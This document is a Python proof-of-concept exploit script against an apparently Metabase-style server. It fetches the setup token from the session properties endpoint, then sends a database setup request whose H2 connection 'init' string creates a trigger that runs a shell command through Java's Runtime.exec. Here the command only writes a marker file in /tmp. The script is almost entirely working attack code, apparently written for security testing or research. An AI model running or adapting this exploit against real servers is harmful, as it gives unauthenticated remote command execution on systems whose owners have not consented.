import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


setup_token = ""


def get_token():
    global setup_token
    gg = requests.get(f"{target_url}/api/session/properties")
    setup_token = gg.json()["setup-token"]
    print(f"Got token: {setup_token}")


def execute():
    global setup_token
    res = requests.post(
        f"{target_url}/api/setup/validate",
        json={
            "token": setup_token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
                    "advanced-options": False,
                    "ssl": True,
                    "init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('touch /tmp/success')\u000A$$",
                },
                "name": "an-sec-research-team",
                "engine": "h2",
            },
        },
    )
    print(res.text)


cmds = [get_token, execute]


all_time = 5
sleep_time = all_time // len(cmds)

for cmd in cmds:
    print(f"sleeping for {sleep_time}.")
    time.sleep(sleep_time)
    cmd()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
